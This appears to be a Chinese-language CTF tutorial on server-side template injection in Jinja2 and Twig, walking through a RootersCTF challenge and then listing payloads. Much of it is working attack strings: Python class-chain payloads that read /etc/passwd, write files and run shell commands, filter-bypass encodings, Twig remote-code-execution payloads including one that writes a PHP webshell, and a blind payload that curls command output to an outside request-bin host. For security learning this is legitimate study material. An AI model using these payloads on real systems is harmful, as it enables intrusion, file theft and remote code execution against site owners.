> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/t0TxqP9gc0uHfoh22Z9NPw)

模板注入漏洞
======

0x00 模板引擎
---------

### 1. 模板引擎介绍

模板引擎（这里特指用于 Web 开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的 HTML 文档。

模板只专注与如何展示数据，根据传入的数据应用各种替换规则替换模板中的参数生成文本（HTML 网页，电子邮件，配置文件，源代码等）

### 2. 模板引擎种类

PHP: Smarty，Twing

python: jinja2,Tornado,Marko

可以根据输入区分模板类型

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2SsDzXdyJQo7fib1qAiaEM7ESRYSexHhQYpubr9xVhRMjaqtZiarsAGZibyg/640?wx_fmt=jpeg)

0x01 模板注入漏洞
-----------

服务端模板注入和常见 Web 注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。模板引擎通常会有一个沙盒.

注入代码原理上是指定框架语言的内置继承函数

      **没有基础的麻烦先仔细阅读下面的 Payload 解读**   

如 Python 的 Payload 解读如下：

```
Payload：[].__class__.__base__.__subclasses__()[40]('fl4g.txt').read()
```

```
[].__class__.__base__.__subclasses__():我们使用这个字符串找到所有的基类
# 注意：基类属于python自带类的，这里的调用就如我们使用python调用外部类
# 即与 import sys加载外部class，且使用sys类中的sys.exit()函数类似

__subclasses()[40]:这里表示我们选择基类表中第41个基类（即type "file"）
# 这里就相当于我们调用了内部类import file,不过由于是内置类，我们不需要在书写代码时写出而已

('fl4g').read():表示定义一个fl4g.txt字符串，然后调用file类中的read()函数执行
#解读代码如下：
import file #日常编程不需要写
a = "fl4g.txt" # 定义一个字符串
b = a.read() # 读本路径下的fl4g.txt文件
print b # 这里的file属于第41个基类属于版本：python2，所以没加()
# 注意，不同python版本的基类位置可能有差别，建议在做题前先做好知识贮备
```

0x02
----

### 模板注入流程：

#### 1. 判断框架类型

识别树如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2SabWdvspLN3Dy9KibLqyicicKlafFQ92SiaKibAsBNTIqDibL9ByBZ7zKr8Mw/640?wx_fmt=jpeg)

注入命令位置：  

```
http://xxx.com/(在/后写入Payload)
也存在http://xxx.com/?a=(在=后写入Payload)
```

判断方法 如：

```
http://xxx.com/{{7*'7'}} # 页面输出49，可判断框架为：Jinja2、Twig ...
```

0x03 jinjia2 模板注入
-----------------

### 1. jinjia2 介绍

　jinja2 是 Flask 作者开发的一个模板系统，起初是仿 django 模板的一个模板引擎，为 Flask 提供模板支持，由于其灵活，快速和安全等优点被广泛使用。

### 2. jinjia2 基本语法

```
{% ... %} 用于声明变量、循环语句和条件语句
{{ ... }} 用于将表达式式输出到模板
{# ... #} 用于注释未包含在模板输出中的内容 
#  ... # 和{%%}相似
```

```
{% set x= 'abcd' %} 声明变量
{% for i in ['a','b','c'] %}{{i}}{%endfor%} 循环语句
{% if 25==5*5 %}{{1}}{% endif %}  条件语句
```

### 3. ssti 思路

在 CTF 中，python 的 ssti 大多是依靠某些继承链，依据 python 中的内置类属性和方法通过寻找可以读文件或执行命令的模块与函数达到我们的目的。

```
ctf中ssti中大多都是通过一个类对象->object类->可用的引用来进行文件读取或命令执行的
可以用循环语句来打印可用的引用
```

这里我用 buu 上的 **[RootersCTF2019]I_<3_Flask** 这道题大概讲解一下

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2SFDh0FA1sSLVlAdnz8NcicibWmuNHCumGMIszl4ThNS8Vrz1mY9iavwibug/640?wx_fmt=jpeg)

可以看到存在 ssti

然后用循环语句打印 object 的所有子类

```
?name={% for i in ''.__class__.__base__.__subclasses__()%}{{loop.index}}{{i.__name__}}{%endfor%}
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2SbwhpwciaD21xQAnhEicvXhQmqibVMzMxib9EpuPsMRpSibcjm4gqcrib2Qqg/640?wx_fmt=jpeg)

我这里用了 {{loop.index}} 来获得类对应的索引，实际上获得的数组是从 0 开始的所以真实索引应该是这个数值减一

然后寻找可用的子类，我这里使用常见的 popen

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2STtbHibXRsWrYvzBW0sX8Jzic1wZYwicicJhmlKk6UibH4JbPXBQ5BkAMwqQ/640?wx_fmt=jpeg)

构造语句

```
?name={{''.__class__.__base__.__subclasses__()[222](%27cat%20flag.txt%27,shell=True,stdout=-1).communicate()[0].strip()}}
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2SWuAvT0WQBVj5gsXOFLxXR1uDHlibwTqXRVVQ364nXGoyKhoEAxoSIicQ/640?wx_fmt=jpeg)

除了直接使用类方法外还有另一种方法，通过初始化类后通过 **func_globals** 或者 **globals** 获得全局变量（返回的是一个字典），或者通过**__builtins__**内建函数获取命令执行所需的函数如：

还是通过演示一下通过 **[RootersCTF2019]I_<3_Flask** 演示一下用__builtins 来达到命令执行

首先用一下大佬脚本找到可用类

```
def search(obj, max_depth):
    visited_clss = []
    visited_objs = []
    def visit(obj, path='obj', depth=0):
        yield path, obj
        if depth == max_depth:
            return
        elif isinstance(obj, (int, float, bool, str, bytes)):
            return
        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            #print(obj) Enumerates the objects traversed
        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)
        # attributes
        for name in dir(obj):
            try:
                attr = getattr(obj, name)
            except:
                continue
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)
        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass
        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)
    yield from visit(obj)
num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if item.__init__.__globals__.keys():
            for path, obj in search(item,5):
                if obj in ('__builtins__','os','eval'):
                    print('[+] ',item,num,path)
        num+=1
    except:
        num+=1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2SQD5c36AclctSiacTzhONw12pS50T8TfibJ9vdFZmWx1ibxEfIMvBVOK6g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2Sq2c5vkBm3FC58akDPBKq7ZSfSKtjLwhBlbxcOkwGskrmNMfO3ib4XYg/640?wx_fmt=jpeg)

构造 payload

```
?name={{''.__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls')").read()}}
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/khmibjLuVibFATQWzl8oZtS71OoibYsUC2SibvYVt0gksT86WISibGntAMwicmicF3QiaibBMyYmqORMIiaBKz7lElOm9tNQ/640?wx_fmt=jpeg)

但通常 ctf 不会直接给出 ssti 漏洞直接利用，通常会有一些过滤字符让我们不太好直接利用需要通过各种手法绕过，下面我会具体讲一下

### 4. 内置类属性和方法

```
__class__          返回对象所属的类
__bases__          以元组形式返回一个类所直接集成的类
__base__           以字符串形式返回一个类所直接集成的类
__mro__            返回解析方法调用的顺序
__subclasses__()   获得类的所有子类
__globals__        用于获取当前空间下可使用的模块、方法及其所有变量
__builtins__       这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数)
__dict__           保存类实例或对象实例的属性变量键值对字典
__init__           类的初始化方法
```

### 5. 常见 payload

1. 获取配置

```
{{config}}
{{self.__dict__._TemplateReference__context.config}}
{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ}}
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
```

2. 命令执行 or 文件读取

```
1.读文件
{{().__class__.__bases__[0].__subclasses__()[40]("/etc/passwd").read()}}
2.写文件
{{().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')}}
3.命令执行
{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat /flag").read()')}}
```

### 6. 常见绕过

1. 当过滤关键字如 “class”、"config"、"eval"、"os" 等

```
1.没过滤引号，使用其他进制，可以使用[]加一下字符反转其他进制绕过
   1.1 其他进制
       ''.__class__ => ''["\137\137\143\154\141\163\163\137\137"](8进制)
       ''.__class__ => ''["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"](16进制)
       {{''['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x62\x61\x73\x65\x5f\x5f']['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']()[80]['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29")['\x72\x65\x61\x64']()}}
   1.2 字符反转
       ''.__class__ => ''["__ssalc__"[::-1]]
   1.3 字符串拼接
       ''.__class__ => ''["__cla""ss__"]
       {{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__buil'+'tins__'[::-1]]['eval']('__import__("os").popen("ls").read()')}}
   1.4 base64 rot13 hex
       ''.__class__ => ''['X19jbGFzc19f'.decode('base64')]
   1.5 lower
       ''.__class__ => ''["__CLASS__"|lower]
   1.6 join
       ''.__class__ => ''[["__clas","s__"]|join]  or ''[("__clas","s__")|join]
   1.7 format
       ''.__class__ => ''["%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)]
   1.8 replace reverse
       ''.__class__ => ''|attr("__ssalc__"|reverse)
2.过滤了引号，通过request将所需的变量从请求中其他参数获得
   2.1 主要利用一下几种
        request.args.x1       get传参
        request.values.x1     post传参
        request.cookies
        request.form.x1       post传参    (Content-Type:applicaation/x-www-form-urlencoded或   multipart/form-data)
        request.data          post传参    (Content-Type:a/b)
        request.json        post传json  (Content-Type: application/json)
    2.2 利用request和attr构造payload     
//get    {{request|attr((request.args.application)|join)|attr((request.args.usc*2,request.args.globals,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.getitem,request.args.usc*2)|join)((request.args.usc*2,request.args.builtins,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.getitem,request.args.usc*2)|join)((request.args.usc*2,request.args.import,request.args.usc*2)|join)((request.args.os)|join)|attr((request.args.popen)|join)((request.args.id)|join)|attr((request.args.read)|join)()}}&usc=_&application=application&globals=globals&getitem=getitem&builtins=builtins&import=import&os=os&popen=popen&id=cat%20flag.txt&read=read
//post
{{request|attr((request.values.application)|join)|attr((request.values.usc*2,request.values.globals,request.values.usc*2)|join)|attr((request.values.usc*2,request.values.getitem,request.values.usc*2)|join)((request.values.usc*2,request.values.builtins,request.values.usc*2)|join)|attr((request.values.usc*2,request.values.getitem,request.values.usc*2)|join)((request.values.usc*2,request.values.import,request.values.usc*2)|join)((request.values.os)|join)|attr((request.values.popen)|join)((request.values.id)|join)|attr((request.values.read)|join)()}}
post: usc=_&application=application&globals=globals&getitem=getitem&builtins=builtins&import=import&os=os&popen=popen&id=cat%20flag.txt&read=read
//其他的也类似
```

2. 过滤`[]`

```
1. __getitem__
 {{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.func_globals.values().__getitem__(13).__getitem__('eval')('__import__("os").popen("cat /flag").read()')}}
2. pop
 {{().__class__.__bases__.pop(0).__subclasses__().pop(59).__init__.func_globals.values().pop(13).pop('eval')('__import__("os").popen("cat /flag").read()')}}
3. get
4. setdefault
```

3. 过滤`.`

```
1. []
    ''.__class__ => ''["__class__"]
2. attr
    ''.__class__ => ''|attr('__class__') or getattr('',"__class__")
```

4. 过滤 {{}}

• 使用 {%%} 外带数据或盲注

```
//外带
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;') %}1{% endif %}
//盲注
{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}1{% endif %}
//打印
{%print config%}
```

5. 过滤_

```
和过滤字符串一样
```

```
使用a.__init__.__globals__.__builtins__['eval']
```

0x04 Twing 模板注入
---------------

没怎么研究过直接贴几个网上的 payload

1. 常用 payload

```
//RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{["id"]|map("system")|join(",")
{{["id", 0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0, 0]|reduce("system", "id")|join(",")}}
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
//读写文件
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
```

0x05 学习博客
---------

```
https://www.leavesongs.com/
https://www.gem-love.com/
https://evoa.me/
https://www.zhaoj.in/
```

这里也有许多干货哦  

公众号